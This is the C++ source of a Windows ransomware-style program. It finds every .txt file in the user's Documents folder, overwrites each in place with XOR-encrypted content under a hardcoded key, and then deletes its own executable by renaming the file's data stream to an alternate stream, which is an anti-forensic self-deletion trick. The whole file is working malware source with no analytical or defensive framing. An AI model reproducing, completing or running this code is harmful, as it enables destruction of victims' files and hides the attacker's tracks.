#include <Windows.h>
#include <iostream>
#include <shlobj.h>
#include <combaseapi.h>
#include <string>
#include <vector>

#pragma comment(lib, "Ole32.lib")

#define KEY "Raulisr00t"
#define NewStream L":Raulisr00t"

using namespace std;

BOOL SelfDelete() {

    WCHAR Path[MAX_PATH * 2] = { 0 };
    FILE_DISPOSITION_INFO Delete = { 0 };
    HANDLE hFile = INVALID_HANDLE_VALUE;
    PFILE_RENAME_INFO pRename = nullptr;
    const wchar_t* stream = (const wchar_t*)NewStream;
    SIZE_T sRename = sizeof(FILE_RENAME_INFO) + sizeof(stream);

    pRename = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
    if (!pRename) {
        wcerr << "[!] Allocation Error" << endl;
        wcerr << "[!] Error:" << GetLastError() << endl;
        return FALSE;
    }

    ZeroMemory(Path, sizeof(Path));
    ZeroMemory(&Delete, sizeof(Delete));

    Delete.DeleteFileW = TRUE;
    pRename->FileNameLength = sizeof(stream);
    RtlCopyMemory(pRename->FileName, stream, sizeof(stream));

    if (GetModuleFileNameW(NULL, Path, MAX_PATH * 2) == 0) {
        wcerr << "[!] File Name Error" << endl;
        wcerr << "[!] Error:" << GetLastError() << endl;
        return FALSE;
    }

    hFile = CreateFileW(Path, DELETE | SYNCHRONIZE, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wcerr << "[!] Opening File for Deleting Error" << endl;
        wcerr << "[!] Error:" << GetLastError() << endl;
        return FALSE;
    }

    wcout << "[+] Renaming :$DATA to %s  ...", stream;

    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
        wcerr << "[!] Setting File Info Error" << endl;
        wcerr << "[!] Error:" << GetLastError() << endl;
        return FALSE;
    }
    wcout << "[+] DONE [+]" << endl;

    CloseHandle(hFile);

    hFile = CreateFileW(Path, DELETE | SYNCHRONIZE, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
        cerr << "[i] Already Deleted" << endl;
        return TRUE;
    }
    if (hFile == INVALID_HANDLE_VALUE) {
        cerr << "[!] Error:" << GetLastError() << endl;
        return FALSE;
    }

    wcout << "[+] DELETING ..." << endl;

    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
        cout << "[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError();
        return FALSE;
    }

    wcout << "[+] DONE " << endl;

    CloseHandle(hFile);

    HeapFree(GetProcessHeap(), 0, pRename);

    return TRUE;
}

wstring GetDocumentsPath() {
    PWSTR documentsPath = nullptr;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Documents, 0, NULL, &documentsPath);

    if (SUCCEEDED(hr)) {
        wstring docPath = documentsPath;
        CoTaskMemFree(documentsPath);  // Free the allocated memory
        return docPath;
    }
    else {
        wcerr << L"[!] Error retrieving Documents folder path. HRESULT: " << hr << endl;
        return L"";  // Return an empty wstring on failure
    }
}

vector<wstring> GetTxtFilesInDirectory(const wstring& directoryPath) {
    vector<wstring> txtFiles;
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;

    // Append \*.txt to the directory path to search for all .txt files
    wstring searchPath = directoryPath + L"\\*.txt";

    hFind = FindFirstFile(searchPath.c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        wcerr << L"[!] FindFirstFile failed. Error: " << GetLastError() << endl;
        return txtFiles;
    }

    do {
        // Ensure it's not a directory
        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            txtFiles.push_back(directoryPath + L"\\" + findFileData.cFileName);
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
    return txtFiles;
}

string XorEncryptDecrypt(const string& data, const string& key) {
    string result(data.size(), '\0');  // Create a string to hold the encrypted/decrypted data
    size_t keyLength = key.size();

    for (size_t i = 0; i < data.size(); ++i) {
        result[i] = data[i] ^ key[i % keyLength];  // XOR each byte with the key, cycling through the key
    }

    return result;
}

BOOL EncryptFile(const wstring& filePath, const string& key) {
    HANDLE hFile = CreateFile(filePath.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wcerr << L"[!] Unable to open file for reading and writing: " << filePath << endl;
        return false;
    }

    // Get file size
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        wcerr << L"[!] Unable to get file size: " << filePath << endl;
        CloseHandle(hFile);
        return false;
    }

    // Read file data
    vector<char> fileData(fileSize.QuadPart);
    DWORD bytesRead;
    if (!ReadFile(hFile, fileData.data(), fileSize.QuadPart, &bytesRead, NULL)) {
        wcerr << L"[!] Unable to read file: " << filePath << endl;
        CloseHandle(hFile);
        return false;
    }

    // Encrypt data
    string encryptedData = XorEncryptDecrypt(string(fileData.begin(), fileData.end()), key);

    // Write encrypted data back to the file
    DWORD bytesWritten;
    if (!SetFilePointerEx(hFile, { 0 }, NULL, FILE_BEGIN) || !WriteFile(hFile, encryptedData.c_str(), encryptedData.size(), &bytesWritten, NULL)) {
        wcerr << L"[!] Unable to write file: " << filePath << endl;
        CloseHandle(hFile);
        return false;
    }

    CloseHandle(hFile);
    return true;
}

int main() {
    wstring documentsPath = GetDocumentsPath();
    if (documentsPath.empty()) {
        wcerr << L"[!] Failed to retrieve Documents folder path." << endl;
        return -1;
    }

    vector<wstring> txtFiles = GetTxtFilesInDirectory(documentsPath);
    if (txtFiles.empty()) {
        wcout << L"No .txt files found in the Documents folder." << endl;
        return 0;
    }

    string key = KEY;

    for (const auto& filePath : txtFiles) {
        if (EncryptFile(filePath, key)) {
            wcout << L"Encrypted file: " << filePath << endl;
        }
        else {
            wcout << L"Failed to encrypt file: " << filePath << endl;
        }
    }

    if (!SelfDelete()) {
        return -1;
    }

    return 0;
}
